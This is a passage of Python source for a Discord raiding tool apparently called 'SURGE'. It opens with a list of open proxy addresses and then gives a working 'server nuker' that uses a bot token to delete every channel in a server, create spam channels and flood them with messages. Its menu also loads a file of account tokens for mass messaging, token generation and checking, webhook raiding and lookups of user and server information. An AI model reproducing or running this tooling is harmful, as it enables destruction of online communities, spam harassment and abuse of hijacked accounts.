http://103.155.246.180:8081     	http://58.20.248.139:9002       	http://206.233.167.67:58394
http://20.190.104.113:80        	http://179.1.142.129:8080       	http://67.43.236.20:26339
http://72.10.160.170:16501      	http://41.207.242.62:80         	http://72.10.164.178:4075
http://67.43.236.20:8605        	http://162.240.75.37:80         	http://116.197.134.13:8080
http://138.94.99.135:8080       	http://172.247.18.3:1080        	http://103.168.123.2:8080
http://67.43.228.253:12637      	http://34.172.92.211:3128       	http://67.43.236.18:32241
http://183.238.165.170:9002     	http://103.130.183.165:5555     	http://103.173.138.252:8080
http://194.44.36.114:6868       	http://72.10.164.178:14213      	http://80.66.81.39:4000
http://67.43.228.253:7491       	http://72.10.160.172:15229      	http://143.198.226.25:80
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
"""
    pages = [page1, page2, page3, page4, page5, page6, page7, page8, page9, page10]  

    def clear_screen():
        os.system('cls' if os.name == 'nt' else 'clear')

    page_number = 0
    while True:
        clear_screen()
        if 0 <= page_number < len(pages):
            from rgbprint import Color
            print(pages[page_number])
            print(f"On Page {page_number + 1}")
            print(f"[PROXIES] Currently 297 Proxies.")
            print(f"[PROXIES] Proxy Update 1: 500+ Proxies")
            print(f"[PROXIES] Proxy Update 2: 1.1k+ Proxies")
        else:
            print("Page not found.")
        
        user_input = input("[>>] ").strip().upper()
        
        if user_input == 'Q':
            if page_number > 0:
                page_number -= 1
            else:
                print("Already at the first page.")
        elif user_input == 'E':
            if page_number < len(pages) - 1:
                page_number += 1
            else:
                print("Already at the last page.")
        elif user_input == 'X':
            break  
        else:
            print("Invalid input. Please choose [Q], [E], or [X].")
        
        await asyncio.sleep(0.1)  


intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True

async def handle_server_nuker():
    bot_token = input("Enter your bot token: ").strip()
    server_id = int(input("Enter the server ID: ").strip())
    base_channel_name = input("Enter the base channel name: ").strip()
    message_to_send = input("Enter the message to send: ").strip()

    temp_client = commands.Bot(command_prefix='!', intents=intents)

    @temp_client.event
    async def on_ready():
        print(f'Logged in as {temp_client.user.name} ({temp_client.user.id})')
        
        guild = temp_client.get_guild(server_id)
        if not guild:
            print(f"Server with ID '{server_id}' not found.")
            await temp_client.close()
            return

        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"Deleted channel: {channel.name}")
            except discord.Forbidden:
                print(f"Permission denied to delete channel: {channel.name}")
            except Exception as e:
                print(f"Failed to delete channel {channel.name}: {e}")

        new_channels = []
        for i in range(10):
            try:
                new_channel = await guild.create_text_channel(f"{base_channel_name}-{i+1}")
                new_channels.append(new_channel)
                print(f"Created channel: {new_channel.name}")
            except discord.Forbidden:
                print(f"Permission denied to create a new channel.")
            except Exception as e:
                print(f"Failed to create channel {base_channel_name}-{i+1}: {e}")

        for channel in new_channels:
            try:
                await channel.send(message_to_send)
                print(f"Sent message to channel: {channel.name}")
            except discord.Forbidden:
                print(f"Permission denied to send message to channel: {channel.name}")
            except Exception as e:
                print(f"Failed to send message to channel {channel.name}: {e}")

        print("Server nuking operation completed. Returning to the main menu.")
        await temp_client.close()

    await temp_client.start(bot_token)

async def main():
    clear_screen()
    set_title("SURGE by Abyzms I Eye Tools .gg/ngTjh3QCTH I Tokens: 0")  

    token_file_path = input("Drag and drop your token file here: ").strip()
    if not os.path.isfile(token_file_path):
        print("Invalid file path. Exiting...")
        return
    
    valid_tokens = await validate_tokens(token_file_path)
    valid_token_count = len(valid_tokens)
    set_title(f"SURGE by Abyzms I Eye Tools .gg/ngTjh3QCTH I Tokens: {valid_token_count}")  
    
    while True:
        display_main_menu(valid_token_count)
        try:
            choice = int(input("Select an option: ").strip())
            if choice == 1:
                await generate_and_check_tokens()
            elif choice == 2:
                token_file_path = input("Enter path to token file: ").strip()
                valid_tokens = await validate_tokens(token_file_path)
                valid_token_count = len(valid_tokens)
                set_title(f"SURGE by Abyzms I Eye Tools .gg/ngTjh3QCTH I Tokens: {valid_token_count}")
                print(f"Valid tokens count: {valid_token_count}")
            elif choice == 3:
                channel_id = input("Enter channel ID: ").strip()
                message = input("Enter message to send: ").strip()
                await send_message_with_tokens(valid_tokens, channel_id, message)
            elif choice == 4:
                channel_ids = input("Enter channel IDs (comma-separated): ").strip().split(',')
                message = input("Enter message to send: ").strip()
                await send_message_to_multiple_channels(valid_tokens, channel_ids, message)
            elif choice == 5:
                token = input("Enter token: ").strip()
                server_id = input("Enter server ID: ").strip()
                await fetch_server_info(token, server_id)
            elif choice == 6:
                token = input("Enter token: ").strip()
                user_id = input("Enter user ID: ").strip()
                await fetch_user_info(token, user_id)
            elif choice == 7:
                await handle_proxies()
            elif choice == 8:
                await handle_webhook_raider(valid_tokens)
            elif choice == 9:
                await handle_server_nuker()
            elif choice == 0:
                break
            else:
                print("Invalid option. Please try again.")
        except ValueError:
            print("Invalid input. Please enter a number.")

if __name__ == "__main__":
    asyncio.run(main())
